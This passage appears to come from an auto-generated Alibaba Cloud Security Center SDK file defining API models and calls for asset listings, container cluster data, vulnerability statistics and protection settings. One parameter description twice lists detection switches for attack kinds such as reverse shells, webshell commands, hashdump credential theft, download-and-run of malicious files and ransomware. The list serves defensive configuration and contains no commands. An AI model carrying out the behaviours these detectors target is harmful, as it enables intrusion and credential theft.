*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='IDC'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the VPC to which the asset belongs.', example='vpc-uf60agqq65bs98zoo****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected on the asset.', example='2'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='Instances', description='An array that consists of the details about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='50'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeCloudCenterInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudCenterInstancesResponseBody(name='body'),
}

/**
  * You can search for assets by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
  *
  * @param request DescribeCloudCenterInstancesRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstancesWithOptions(request: DescribeCloudCenterInstancesRequest, runtime: Util.RuntimeOptions): DescribeCloudCenterInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.importance)) {
    query['Importance'] = request.importance;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noGroupTrace)) {
    query['NoGroupTrace'] = request.noGroupTrace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudCenterInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can search for assets by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
  *
  * @param request DescribeCloudCenterInstancesRequest
  * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstances(request: DescribeCloudCenterInstancesRequest): DescribeCloudCenterInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudCenterInstancesWithOptions(request, runtime);
}

model DescribeCloudProductFieldStatisticsResponseBody = {
  groupedFields?: {
    categoryCount?: string(name='CategoryCount', description='The statistics of the numbers of assets of different types. **MachineType** indicates the type of the assets. **Count** indicates the number of assets that belong to the type.
Valid values of **MachineType**:

*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='[{"MachineType":1,"Count":11}]'),
    instanceCount?: int32(name='InstanceCount', description='The total number of cloud services that are protected by Security Center.', example='100'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of cloud services that are at risk.', example='90'),
  }(name='GroupedFields', description='The statistics of cloud services.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeCloudProductFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudProductFieldStatisticsResponseBody(name='body'),
}

async function describeCloudProductFieldStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeCloudProductFieldStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCloudProductFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCloudProductFieldStatistics(): DescribeCloudProductFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudProductFieldStatisticsWithOptions(runtime);
}

model DescribeClusterBasicInfoRequest {
  clusterId?: string(name='ClusterId', example='c870ec78ecbcb41d2a35c679823ef****'),
  targetType?: string(name='TargetType', example='Cluster'),
  type?: string(name='Type', example='containerNetwork'),
}

model DescribeClusterBasicInfoResponseBody = {
  clusterInfo?: {
    clusterId?: string(name='ClusterId', example='c870ec78ecbcb41d2a35c679823ef****'),
    clusterName?: string(name='ClusterName', example='testackpro'),
    clusterType?: string(name='ClusterType', example='kubernetes'),
    createTime?: long(name='CreateTime', example='1662038134000'),
    currentVersion?: string(name='CurrentVersion', example='1.22.10-aliyun.1'),
    instanceCount?: int32(name='InstanceCount', example='10'),
    regionId?: string(name='RegionId', example='cn-hangzhou'),
    state?: string(name='State', example='Available'),
    targetResult?: boolean(name='TargetResult', example='true'),
  }(name='ClusterInfo'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeClusterBasicInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterBasicInfoResponseBody(name='body'),
}

async function describeClusterBasicInfoWithOptions(request: DescribeClusterBasicInfoRequest, runtime: Util.RuntimeOptions): DescribeClusterBasicInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterBasicInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterBasicInfo(request: DescribeClusterBasicInfoRequest): DescribeClusterBasicInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterBasicInfoWithOptions(request, runtime);
}

model DescribeClusterInfoListRequest {
  target?: string(name='Target', example='c23551de6149343e8a54e69fbefe6****'),
  targetType?: string(name='TargetType', example='Cluster'),
  type?: string(name='Type', example='containerNetwork'),
}

model DescribeClusterInfoListResponseBody = {
  clusterList?: [ 
    {
      clusterId?: string(name='ClusterId', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      clusterName?: string(name='ClusterName', example='test111'),
      clusterType?: string(name='ClusterType', example='ManagedKubernetes'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      state?: string(name='State', example='Available'),
      targetResult?: boolean(name='TargetResult', example='true'),
    }
  ](name='ClusterList'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeClusterInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterInfoListResponseBody(name='body'),
}

async function describeClusterInfoListWithOptions(request: DescribeClusterInfoListRequest, runtime: Util.RuntimeOptions): DescribeClusterInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterInfoList(request: DescribeClusterInfoListRequest): DescribeClusterInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterInfoListWithOptions(request, runtime);
}

model DescribeClusterNetworkRequest {
  endTime?: long(name='EndTime', example='1656038940435'),
  startTime?: long(name='StartTime', example='1656038740435'),
}

model DescribeClusterNetworkResponseBody = {
  clusterNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', example='cfb41a869c71e4678a97021582dd8****'),
        dstNodeType?: string(name='DstNodeType', example='cluster'),
        id?: string(name='Id', example='1'),
        port?: string(name='Port', example='6164'),
        srcNodeId?: string(name='SrcNodeId', example='cfb41a869c71e4678a97021582dd8****'),
        srcNodeType?: string(name='SrcNodeType', example='cluster'),
      }
    ](name='Edge'),
    node?: [ 
      {
        cnnfSwitch?: int32(name='CnnfSwitch', example='1'),
        id?: string(name='Id', example='cfeb7a9f99ce740e98c5595d0fe37****'),
        interceptionType?: int32(name='InterceptionType', example='1'),
        name?: string(name='Name', example='testwww'),
        netTopoSwitch?: string(name='NetTopoSwitch', example='ON'),
        riskLevel?: string(name='RiskLevel', example='3'),
        type?: string(name='Type', example='cluster'),
      }
    ](name='Node'),
  }(name='ClusterNetwork'),
  requestId?: string(name='RequestId', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model DescribeClusterNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterNetworkResponseBody(name='body'),
}

async function describeClusterNetworkWithOptions(request: DescribeClusterNetworkRequest, runtime: Util.RuntimeOptions): DescribeClusterNetworkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterNetwork(request: DescribeClusterNetworkRequest): DescribeClusterNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterNetworkWithOptions(request, runtime);
}

model DescribeClusterVulStatisticsRequest {
  clusterId?: string(name='ClusterId', example='c471f0f61b9c04f8380556e922cf1****'),
  types?: string(name='Types', example='cve,app,sca'),
}

model DescribeClusterVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  vulStat?: {
    asapCount?: string(name='AsapCount', example='13'),
    laterCount?: string(name='LaterCount', example='21'),
    nntfCount?: string(name='NntfCount', example='0'),
  }(name='VulStat'),
}

model DescribeClusterVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterVulStatisticsResponseBody(name='body'),
}

async function describeClusterVulStatisticsWithOptions(request: DescribeClusterVulStatisticsRequest, runtime: Util.RuntimeOptions): DescribeClusterVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClusterVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeClusterVulStatistics(request: DescribeClusterVulStatisticsRequest): DescribeClusterVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClusterVulStatisticsWithOptions(request, runtime);
}

model DescribeCommonOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.61.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
}

model DescribeCommonOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
  }(name='OverallConfig', description='The information about the feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigResponseBody(name='body'),
}

async function describeCommonOverallConfigWithOptions(request: DescribeCommonOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfig(request: DescribeCommonOverallConfigRequest): DescribeCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigWithOptions(request, runtime);
}

model DescribeCommonOverallConfigListRequest {
  sourceIp?: string(name='SourceIp', example='119.136.XX.XX'),
  typeList?: [ string ](name='TypeList'),
}

model DescribeCommonOverallConfigListResponseBody = {
  overallList?: [ 
    {
      config?: string(name='Config', example='on'),
      totalCount?: int32(name='TotalCount', example='184'),
      type?: string(name='Type', example='kdump_switch'),
    }
  ](name='OverallList'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeCommonOverallConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigListResponseBody(name='body'),
}

async function describeCommonOverallConfigListWithOptions(request: DescribeCommonOverallConfigListRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonOverallConfigList(request: DescribeCommonOverallConfigListRequest): DescribeCommonOverallConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigListWithOptions(request, runtime);
}

model DescribeCommonTargetConfigRequest {
  type?: string(name='Type', example='kdump_switch'),
}

model DescribeCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  targetList?: [ 
    {
      flag?: string(name='Flag', example='add'),
      target?: string(name='Target', example='c23551de6149343e8a54e69fbefe6****'),
      targetType?: string(name='TargetType', example='image_repo'),
    }
  ](name='TargetList'),
}

model DescribeCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetConfigResponseBody(name='body'),
}

async function describeCommonTargetConfigWithOptions(request: DescribeCommonTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetConfig(request: DescribeCommonTargetConfigRequest): DescribeCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetConfigWithOptions(request, runtime);
}

model DescribeCommonTargetResultListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.57.XX.XX'),
  type?: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection', example='webshell_timescan'),
}

model DescribeCommonTargetResultListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  targetConfig?: {
    flag?: string(name='Flag', description='The identifier that indicates whether the configuration item is applied to the server. Valid values:

*   **add**: applied
*   **del**: not applied', example='del'),
    targetDefault?: string(name='TargetDefault', description='The default identifier.', example='add'),
    targetList?: [ string ](name='TargetList', description='An array that consists of the IDs of the server groups or the UUIDs of the servers.

>  If **uuid** is returned for the **TargetType** parameter, **UUIDs** of the servers are returned. If **groupId** is returned for the **TargetType** parameter, IDs of the server groups are returned.'),
    targetType?: string(name='TargetType', description='The type of the server to which the configuration item is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group', example='uuid'),
    totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='22'),
